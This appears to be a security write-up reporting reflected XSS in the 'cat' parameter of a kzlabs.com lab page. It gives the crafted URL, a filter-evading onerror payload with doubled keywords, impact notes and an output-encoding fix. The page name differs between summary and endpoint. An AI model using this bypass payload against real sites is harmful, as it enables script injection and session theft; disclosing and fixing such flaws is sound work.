## Title
Reflected Cross-Site Scripting (XSS) via `cat` Parameter

## Vulnerability Type
Reflected XSS

## Summary
In `https://kzlabs.com/punishment/32.php`, the `cat` parameter is vulnerable to reflected Cross-Site Scripting (XSS). The application reflects user-supplied input directly into the response without proper sanitization or output encoding, allowing execution of malicious JavaScript in the victim’s browser when a crafted URL is visited.

## Vulnerable Endpoint
https://kzlabs.com/punishment/33.php?cat=Rajvardhan%3Cimimgg%20src=x%20onerror=%22propromptmpt(1)%22%3E

## Steps to Reproduce

1. Navigate to the following URL: `https://kzlabs.com/punishment/33.php?cat=Rajvardhan%3Cimimgg%20src=x%20onerror=%22propromptmpt(1)%22%3E`
2. 
2. Observe that a JavaScript alert box is triggered, confirming successful execution of injected payload.

## Payload Used
`Rajvardhan<imimgg src=x onerror="propromptmpt(1)">`

## Proof of Concept

Screenshot 1: Payload reflected in application input  
<img width="1920" height="807" alt="image" src="https://github.com/user-attachments/assets/960e7234-beb1-4194-b721-b93a6777fe23" />

## Impact

An attacker can exploit this vulnerability to:

- Hijack user sessions via cookie theft or token manipulation  
- Perform unauthorised actions on behalf of authenticated users  
- Execute arbitrary JavaScript in the victim’s browser context  
- Exfiltrate sensitive information from the application  

## Recommendations for Fix

1. Validate all user input on the server side before processing.  
2. Encode output properly before rendering in HTML context.  
3. Avoid directly reflecting raw user input into responses.  
4. Use secure PHP encoding: ```php, htmlspecialchars($input, ENT_QUOTES, 'UTF-8');```  
